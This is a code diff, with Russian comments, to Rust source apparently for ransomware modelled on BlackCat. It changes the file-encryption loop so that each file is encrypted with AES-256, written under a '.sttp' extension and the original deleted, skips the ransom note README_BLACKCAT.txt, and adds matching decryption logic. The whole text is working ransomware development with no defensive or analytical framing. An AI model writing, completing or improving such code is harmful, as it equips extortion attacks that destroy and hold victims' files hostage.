@@ -5,6 +5,7 @@ use aes_gcm::{Aes256Gcm, Nonce, Key, aead::Aead, KeyInit as AesKeyInit};
 use chacha20poly1305::ChaCha20Poly1305;
 use chacha20poly1305::KeyInit as ChaChaKeyInit;
 use rand::Rng;
+use std::fs; 
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct RansomwareConfig {
@@ -23,14 +24,21 @@ impl BlackCatRansomware {
         crypto_engine: &CryptoEngine,
     ) -> Result<(), Box<dyn Error>> {
         for file in files {
-            let content = std::fs::read(&file)?;
+            // Пропускаем саму записку, если она уже есть
+            if file.contains("README_BLACKCAT.txt") { continue; }
+
+            let content = fs::read(&file)?;
             let encrypted = crypto_engine.encrypt_aes_256(&content)?;
-            std::fs::write(&file, encrypted)?;
+            
+            // Новое имя файла с расширением .sttp
+            let new_path = format!("{}.sttp", file);
+            
+            fs::write(&new_path, encrypted)?;
+            fs::remove_file(&file)?; // Удаляем оригинал
         }
         Ok(())
     }
 
-    // ТЕПЕРЬ ФУНКЦИЯ ВНУТРИ БЛОКА IMPL
     pub async fn decrypt_all_files(
         files: Vec<String>,
         config: RansomwareConfig,
@@ -38,10 +46,19 @@ impl BlackCatRansomware {
     ) -> Result<(), Box<dyn Error>> {
         let use_chacha20 = config.encryption_algorithm == "chacha20";
         for file in files {
-            let content = std::fs::read(&file)?;
-            // Здесь вызывается метод, который нужно добавить в crypto.rs
+            // ИСПРАВЛЕНИЕ: Дешифруем ТОЛЬКО файлы с расширением .sttp
+            if !file.ends_with(".sttp") {
+                continue;
+            }
+
+            let content = fs::read(&file)?;
             let decrypted = crypto_engine.decrypt_file(&content, use_chacha20)?;
-            std::fs::write(&file, decrypted)?;
+            
+            // Убираем расширение .sttp
+            let original_path = file.trim_end_matches(".sttp").to_string();
+            
+            fs::write(&original_path, decrypted)?;
+            fs::remove_file(&file)?; // Удаляем зашифрованную версию
         }
         Ok(())
     }
